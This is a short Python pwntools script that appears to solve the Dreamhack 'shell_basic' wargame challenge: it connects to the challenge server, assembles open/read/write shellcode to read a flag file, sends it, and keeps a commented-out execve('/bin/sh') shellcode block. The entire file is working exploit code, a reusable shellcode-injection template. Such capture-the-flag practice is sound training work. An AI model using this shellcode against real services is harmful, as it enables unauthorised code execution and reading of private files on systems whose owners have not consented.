#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./shell_basic',checksec=False)
context.arch = 'amd64'

r= remote('host2.dreamhack.games',8223)
# r = process(exe.path)
# input()
# shellcode = asm(

# 	'''
# 	mov rbx,29400045130965551
# 	push rbx
# 	mov rdi,rsp
# 	xor rsi,rsi
# 	xor rdx,rdx
# 	mov rax,0x3b

# 	syscall

# 	''',
# 	arch='amd64'
	# )

flag = '/home/shell_basic/flag_name_is_loooooong'
shellcode = shellcraft.open(flag)
shellcode += shellcraft.read('rax','rsp',0x80)
shellcode += shellcraft.write(1,'rsp',0x80)

payload = asm(shellcode)


r.sendafter(b'shellcode: ',payload)


r.interactive()